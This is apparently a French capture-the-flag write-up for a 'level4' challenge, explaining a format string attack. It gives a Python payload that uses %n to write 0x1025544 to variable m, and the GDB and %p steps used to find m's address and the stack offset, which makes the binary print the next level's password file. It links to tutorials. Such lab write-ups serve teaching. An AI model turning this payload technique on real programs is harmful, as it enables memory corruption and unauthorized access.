# Exploit: Attaque de chaîne de format

**Commande**:  
```bash
python -c 'print "\x10\x98\x04\x08" + "%16930112c" + "%12$n"' > /tmp/exploit4
```

**Explication**:  
Ce niveau est presque le meme que le niveau d'avant, le seul changement est cette condition : 
```C
if (m == 0x1025544) {
        system("/bin/cat /home/user/level5/.pass");
}
```
- Utiliser GDB pour obtenir l'adresse de m. Lancez le débogage avec gdb ./level4, mettez un point d'arrêt sur la fonction pertinente avec `break n`, puis obtenez l'adresse de m avec `p &m` :
    $1 = (<data variable, no debug info> *) 0x8049810
- Exécuter une commande pour déterminer à quelle position les données entrées (ici AAAA) apparaissent dans les arguments passés à printf. Utilisez la commande :
   `python -c 'print "AAAA" + " %p" * 20' - | ./level4`
- Analyser la sortie pour localiser 0x41414141 (représentation hexadécimale de AAAA). Dans cet exemple, 0x41414141 apparaît à la 12e position, indiquant que AAAA est le 12e argument de printf.
- Construction du payload : L'adresse où écrire doit être incluse au début du payload pour s'assurer que printf écrit au bon endroit. Puisque vous souhaitez écrire à l'adresse de m : \x10\x98\x04\x08
- Le nombre total de caractères à imprimer avant de réaliser l'écriture doit être calculé. On doit écrire la valeur 0x1025544 à l'adresse de m. Le payload doit donc imprimer 16930112 caractères (16930116 moins les 4 octets de l'adresse) : %16930112c
Utiliser %12$n pour indiquer à printf d'écrire le nombre total de caractères imprimés à la 12e position dans la pile, où AAAA a été placé.
- Payload final : \x10\x98\x04\x08" + "%16930112c" + "%12$n

**Ressources**:

- [Les failles Format String - Zenk Security](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Les%20failles%20Format%20String.pdf)
- [Exploit 101: Format Strings - Axcheron](https://axcheron.github.io/exploit-101-format-strings/)
- [Format String Attack - OWASP](https://owasp.org/www-community/attacks/Format_string_attack)
